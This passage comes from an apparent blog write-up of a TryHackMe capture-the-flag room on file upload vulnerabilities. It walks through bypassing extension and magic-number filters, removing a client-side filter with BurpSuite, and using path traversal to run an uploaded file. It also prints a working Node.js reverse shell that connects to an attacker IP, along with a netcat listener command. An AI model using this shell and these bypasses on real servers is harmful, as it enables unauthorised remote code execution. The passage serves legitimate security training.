+<p>We begin by verifying that a standard <code>.jpeg</code> file can be uploaded; and that a <code>shell.php</code> script can not. After experimenting with files to better understand what the server will and will not accept, we reach the conclusion that there are no shell extensions that will pass through the filter and also execute on the server.</p>
+<p>We then remember that the filtering mechanism in the previous example used <code>pathinfo()</code> to get the file&rsquo;s extension by parsing the characters after the final <code>.</code> in the filename.</p>
+<pre tabindex="0"><code>$extension = pathinfo($_FILES[&#34;fileToUpload&#34;][&#34;name&#34;])[&#34;extension&#34;];
+</code></pre><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
+<p>Before offering our task question, the text asks us to consider that these examples are among many possibilities for exploiting upload vulnerabilities.</p>
+<blockquote>
+<p>As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming &ndash; your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.</p>
+</blockquote>
+<p><strong>Note:</strong> The room lets us know, for the first time, that this task has implemented a randomized naming scheme and that directories will not always be indexable.</p>
+<h4 id="question-81">Question 8.1</h4>
+<h5 id="what-is-the-flag-in-varwww-1">What is the flag in /var/www/?</h5>
+<p>As in the examples, we begin by navigating to the target site. When we reach <code>annex.uploadvulns.thm</code> , we are greeted with a pseudo-command line interface, which allows us to upload files.</p>
+<p><img src="https://robscharf.github.io/images/uv/anx-home.png" alt="anx-home"></p>
+<p>First, we will upload a standard file to the server. Successsfully doing so will simultaneously give us a file to look for in the server&rsquo;s upload destination directory and also start informing us of which file formats pass through the filter. I will use the same <code>coffee.png</code> clip art file from the previous task for this purpose.</p>
+<p>We then begin our investigation by running a <code>gobuster</code> scan of <code>annex.uploadvulns.thm</code>:</p>
+<pre tabindex="0"><code>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
+</code></pre><p>The scan enumerates the following directories:</p>
+<pre tabindex="0"><code>1. /privacy (Status: 301) [Size: 332] [--&gt; http://annex.uploadvulns.thm/privacy/]
+2. /assets (Status: 301) [Size: 331] [--&gt; http://annex.uploadvulns.thm/assets/]
+</code></pre><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
+<p><img src="https://robscharf.github.io/images/uv/anx-assets.png" alt="anx-assets"></p>
+<p>From here, we try to upload our reverse shell script directly, but are given this error message, as our payload was filtered by the server.</p>
+<p><img src="https://robscharf.github.io/images/uv/anx-invalid.png" alt="anx-invalid"></p>
+<p>From our guided walkthrough earlier, we learned that there are multiple valid and server-executable <code>PHP</code> file extensions, including <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php7</code>, <code>.phps</code>, <code>.php-s</code>, <code>.pht</code> and <code>.phar</code>. With this knowledge, we can iterate through file extensions for our handy <code>ptm-shell.php</code> script.</p>
+<p><img src="https://robscharf.github.io/images/uv/anx-ext.png" alt="anx-ext"></p>
+<p>While we receive <code>File type is invalid</code> responses for 8 of the 9 files listed above, <code>ptm-shell.php5</code> makes it through the server&rsquo;s filter and into the <code>/privacy</code> directory.</p>
+<p><img src="https://robscharf.github.io/images/uv/anx-php5.png" alt="anx-php5"></p>
+<p>From here we simply invoke our <code>netcat</code> listener on our attack machine with:</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
+<p><img src="https://robscharf.github.io/images/uv/anx-solution.png" alt="anx-solution"></p>
+<h2 id="task-9---bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers</h2>
+<p>This task builds on the previous one, highlighting the use of &ldquo;magic number checking&rdquo; as an approach to server-side filtering.</p>
+<h3 id="methodology-2">Methodology</h3>
+<h4 id="evading-server-side-magic-number-based-filters">Evading server-side magic number-based filters</h4>
+<p>This task&rsquo;s walkthrough begins again with a webpage housing a file upload form. As is expected, <code>.php</code> files are caught in the server&rsquo;s filter, while <code>.jpeg</code> images are not.</p>
+<p>As we know that <code>.jpeg</code> files are permitted by the filter, we should be able to add the &ldquo;magic numbers&rdquo; <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">that correspond to this file type</a> to the top of our <code>.php</code> script. To do so, we first add 4 conventional characters (it does not matter which) to the top of our <code>ptm-shell.php</code> script.</p>
+<p>Next, we open the file in <code>hexeditor</code> (or an equivalent application) and change the conventional characters to <code>FF D8 FF DB</code> - the magic numbers for <code>.jpeg</code> format files. To check that this has been done properly, run:</p>
+<pre tabindex="0"><code>file ptm-shell.php
+</code></pre><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
+<p>We are then able to upload our <code>.php</code> reverse shell script, now disguised as a <code>.jpeg</code> image, to the server and execute it.</p>
+<p>Before being given the challenge associated with this task, we are warned that directory indexing has been disabled on the target server.</p>
+<h4 id="question-91">Question 9.1</h4>
+<h5 id="what-is-the-flag-in-varwww-2">What is the flag in /var/www/?</h5>
+<p>Similar to past tasks, we begin by running a <code>gobuster</code> directory scan, which discovers:</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-gb.png" alt="magic-gb"></p>
+<p>While we are not able to view the contents of these directories, due to thier non-indexable nature, we can remain confident that any uploaded files will be housed in one of these locations.</p>
+<p>Next, we will send the server some legitimate files to help us improve our understanding of the scope of allowable, unfiltered files that can be uploaded. When attempting to upload our basic test images, we receive the following message:</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-gifsonly.png" alt="magic-gifsonly"></p>
+<p>Now that we know <code>.gif</code> files pass through the server&rsquo;s filter, we upload a new test image, <code>magic.gif</code> to the server and receive a <code>File successfully uploaded</code> message in place of the error message above.</p>
+<p>While navigating to <code>http://magic.uploadvulns.thm/assets/magic.gif</code> does not result in access to our uploaded test image, <code>http://magic.uploadvulns.thm/graphics/magic.gif</code> does. Thus, we conclucde that files uploaded to the server are directed to <code>http://magic.uploadvulns.thm/graphics/</code>.</p>
+<p>We will now attempt to disguise our favorite reverse shell script, <code>ptm-shell.php</code> as a <code>.gif</code> image file. Currently, it is recognized as:</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-ft-php.png" alt="magic-ft-php"></p>
+<p>Using our <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia reference</a>, we find that <code>.gif</code> files use the &ldquo;magic numbers&rdquo; <code>47 49 46 38 37 61</code>. After adding our dummy characters, we use <code>hexeditor</code> to change the first six hex values to our new set of numbers.</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-hex.png" alt="magic-hex"></p>
+<p>This results in our file being recognized as a <code>.gif</code> :</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-disguised-php.png" alt="magic-disguised-php"></p>
+<p>We are then able to successfully upload <code>ptm-shell.php</code> to the server, activate our <code>netcat</code> listener, and execute the script by navigating to <code>http://magic.uploadvulns.thm/graphics/ptm-shell.php</code>. This spawns our reverse shell and gives us access to the flag.</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-flag.png" alt="magic-flag"></p>
+<h2 id="task-10---example-methodology">Task 10 - Example Methodology</h2>
+<p>This task gives a useful broken-down overview of the process of auditing and exploiting file upload vulnerabilities on a given target. I will paraphrase the content below, but certainly encourage reading <a href="https://tryhackme.com/room/uploadvulns">the full version</a> in the THM room.</p>
+<h3 id="general-step-by-step-walkthrough">General step-by-step walkthrough</h3>
+<ol>
+<li>Surface-level analysis of the web page/site/application, as a whole.
+<ul>
+<li>Tools like <code>Wappalyzer</code> give insight into the languages and frameworks used in engineering the application.</li>
+<li>Interception of server responses via <code>BurpSuite</code> can also provide useful information.
+<ul>
+<li>Specifically, headers such as <code>server</code> or <code>x-powered-by</code> can yield essential server information.</li>
+</ul>
+</li>
+<li>At this point, analyzing the attack surface to identify a viable attack vector (e.g., a file upload page) becomes relevant, if necessary.</li>
+</ul>
+</li>
+<li>Inspect potential vulnerabilities (e.g., the aforementioned file upload page)
+<ul>
+<li>Client-side filtering scripts are a good first area to focus on, as they are low-hanging fruit in terms of our level of control over them.</li>
+</ul>
+</li>
+<li>Work to successfully upload a standard &ldquo;control&rdquo; file (i.e., one without any malicious inclusions or alterations) to the server
+<ul>
+<li>This allows us to learn more about the server&rsquo;s filtering logic, by beginning to build a list of acceptable uploads.</li>
+<li>Equally, this allows us to determine where on the server uploaded files are stored and if there are any restrictions in accessing files in this destination directory.</li>
+<li>After making progress on the above task, we can determine if the server renames uploads in accordance with a pre-determined scheme.
+<ul>
+<li>Importantly, the text notes that the <code>-x</code> flag in <code>gobuster</code> is helpful in the event that successfully uploaded files are difficult to locate.
+<ul>
+<li>For example, including <code>-x php,txt,html</code> in a <code>gobuster</code> command will append each of these extensions to the selected wordlist.</li>
+<li>This is especially useful in scenarios where the server is renaming uploaded files.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Begin attempting malicious file uploads
+<ul>
+<li>While we expect that server-side filters will stop us from directly delivering our payload, the information that can be derived from resulting error messages will further inform our approach.</li>
+<li>Here are four suggested considerations for beginning to circumvent server-side filters:
+<ol>
+<li>If files with clearly invalid extensions (e.g., <code>.invalidfileextension</code>) can be successfully uploaded, it is likely that the server is using a blacklist, instead of a whitelist.</li>
+<li>Changing the &ldquo;magic numbers&rdquo; of your &ldquo;control&rdquo; file (mentioned in step 3) to those of a likely or demonstrably filtered file extension can reveal if the server is using a filtering system that targets them.</li>
+<li>Similar to the above, intercepting upload submissions via <code>BurpSuite</code> and modifying the MIME identification headers can reveal if the server is filtering in this manner.</li>
+<li>If there are restrictions on uploaded files&rsquo; size/length, using progressively larger file sizes can allow for deducing the server&rsquo;s limit.</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="task-11---challenge">Task 11 - Challenge</h2>
+<h3 id="initial-investigation">Initial investigation</h3>
+<p>After downloading the provided wordlist, we navigate to <code>http://jewel.uploadvulns.thm/</code>. Immediately, <code>Wappalyzer</code> shows us several relevant technologies found on the page:</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-wap.png" alt="jewel-wap"></p>
+<p>From this, we learn that this site is running <a href="https://expressjs.com/">Express</a>, a <code>Node.js</code> web application framework. This means that our <code>ptm-shell.php</code> reverse shell script will almost certainly not work, as the server is configured to run <code>JavaScript</code> code.</p>
+<p>Luckily for us, the PayloadsAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">Reverse Shell Cheat Sheet repository</a> on GitHub includes a reverse shell script for use with <code>Node.js</code>. Here it is:</p>
+<pre tabindex="0"><code>(function(){
+    var net = require(&#34;net&#34;),
+        cp = require(&#34;child_process&#34;),
+        sh = cp.spawn(&#34;/bin/sh&#34;, []);
+    var client = new net.Socket();
+    client.connect(4242, &#34;10.0.0.1&#34;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+</code></pre><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
+<h3 id="identifying-vulnerabilities">Identifying vulnerabilities</h3>
+<p>For more information, we can inspect the source code of the page, which includes a <code>.js</code> script called <code>/upload.js</code> that uses the following filtering scheme:</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-uploadjs.png" alt="jewel-uploadjs"></p>
+<p>Also, note this line in the source code of the home page:</p>
+<pre tabindex="0"><code>&lt;input id=&#34;fileSelect&#34; type=&#34;file&#34; name=&#34;fileToUpload&#34; accept=&#34;image/jpeg&#34;&gt;
+</code></pre><p>We can deduce, from the above code, that the server:</p>
+<ul>
+<li>Has a size/length limit in place</li>
+<li>Filters files that do not contain <code>ÿØÿ</code> as the first three &ldquo;magic number values&rdquo;
+<ul>
+<li>This corresponds with the first three <code>ISO</code> values for <code>.jpg</code> files</li>
+</ul>
+</li>
+<li>Filters files that do not have a <code>.jpg</code> or <code>.jpeg</code> file extension</li>
+</ul>
+<p>However, as this is a filtering mechanism that takes place client-side, we will be able to intercept the contents of the script and remove them via <code>BurpSuite</code>, so this should not be much of a problem for us when uploading our malicious payload.</p>
+<h3 id="finding-file-upload-destination">Finding file upload destination</h3>
+<p>Now we can work toward determinig where file uploads are stored on the server in order to access them.</p>
+<p>Next, we upload a standard image file, <code>jewel.jpg</code> to the server.</p>
+<p>The upload form on the home page tells us that we can upload an image and &ldquo;add it to the slides.&rdquo; This means that our uploaded image, <code>jewel.jpg</code>, should be stored in the same location as the rest of the slide images.</p>
+<p>By using the in-built Firefox Developer Tools, we can see that the other background slider images are stored in the server&rsquo;s <code>/content</code> directory.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-sliderdir.png" alt="jewel-sliderdir"></p>
+<h3 id="more-enumeration">More enumeration</h3>
+<p>To get a better picture of the directory structure, we return to <code>gobuster</code>.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-gb-dir.png" alt="jewel-gb-dir"></p>
+<p>While it seems as though our standard image upload was successful, unfortunately, navigating to <code>/content/jewel.jpg</code> does not give us direct access to the image (nor does<code>/modules/jewel.jpg</code>, <code>/assets/jewel.jpg</code>, or <code>/admin/jewel.jpg</code>).</p>
+<p>However, we note that navigating to the <code>/admin</code> page itself gives us access to a &ldquo;Top Secret!&rdquo; webform with which to activate modules from the <code>/modules</code> server directory, meaning that we can execute specific files.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-admin-page.png" alt="jewel-admin-page"></p>
+<p>Next, we can try a more targeted <code>gobuster</code> scan in the server&rsquo;s <code>/content</code> directory, to try to find our uploaded <code>.jpg</code> file, using the downloadable wordlist presented to us by the THM task.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-gb-jpg.png" alt="jewel-gb-jpg"></p>
+<p>In addition to <code>ABH.jpg</code>, <code>LKQ.jpg</code>, <code>SAD.jpg</code>, and <code>UAD.jpg</code>, which make up the slideshow images on the home page, we see <code>RNG.jpg</code>. To confirm that this is ours, we can visit <code>http://jewel.uploadvulns.thm/content/RNG.jpg</code> in our browser and ensure that our uploaded image file is visible.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-uploaded.png" alt="jewel-uploaded"></p>
+<h3 id="bypassing-filters">Bypassing filters</h3>
+<p>Now that we have identified the destination of uploaded <code>/jpg</code> images to the server,
+we need to figure out how to get our <code>njs-shell.js</code> reverse shell past the upload filters, both client-side and server-side.</p>
+<p>Let us begin by renaming our <code>njs-shell.js</code> script to <code>njs-shell.jpg</code> to conform with the identified file extension for bypassing any (server-side) MIME filters that may exist. If we find that the server is incapable of executing our script with a <code>.jpg</code> ending, we can revisit.</p>
+<p>Our next step to successfully uploading our reverse shell will be to defeat this, which runs on our (client) browser when we load the <code>http://jewel.uploadvulns.thm</code> home page.</p>
+<p>We can do this in <code>BurpSuite</code> by removing the prohibitive code from  <code>upload.js</code> before the served content is rendered in our browser. To do so, we enable <code>interception</code> and refresh the page. Forward along each request until you reach the one related to <code>upload.js</code>, then right click the request space and choose <code>do intercept</code> then <code>response to this request</code>.</p>
+<p><strong>Note:</strong> If you have a cached version of <code>upload.js</code> and other site assets, you will not be able to edit the script, as the server will send a message confirming the validity of your cached script instead of its contents.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-jsfilter.png" alt="jewel-jsfilter"></p>
+<p>After removing the necessary code, which we initially uncovered during the Identifying Vulnerabilities phase, we forward the new script to our browser. We can then successfully upload our <code>njs-shell.jpg</code> file to the server.</p>
+<p>In order to confirm our success, we can run another <code>gobuster</code> scan, which confirms the existence of <code>LED.jpg</code> in the <code>/content</code> directory.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-jsjpg-upload.png" alt="jewel-jsjpg-upload"></p>
+<p>To activate our reverse shell and achieve RCE, we&rsquo;ll need to remember to enable our <code>netcat</code> listener with:</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
+<p><img src="https://robscharf.github.io/images/uv/jewel-led-rce.png" alt="jewel-led-rce"></p>
+<p><em>et voilà!</em></p>
+<p>Thanks to <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a> for the informative room!</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>i.e., without access to, or knowledge of, the source code.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://robscharf.github.io/tags/blog/">blog</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/tryhackme/">tryhackme</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/gobuster/">gobuster</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/burpsuite/">burpsuite</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/php/">php</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/node.js/">node.js</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://robscharf.github.io/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        5352 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-04-28 04:30
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up&amp;caption=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up&amp;canonicalUrl=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up&amp;body=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f&amp;media=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f;description=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f&amp;title=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up&amp;summary=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up&amp;source=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f&amp;resubmit=true&amp;title=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f04%2fthm-upload-vulnerabilities--write-up%2f;title=THM%3a%20Upload%20Vulnerabilities%20--%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
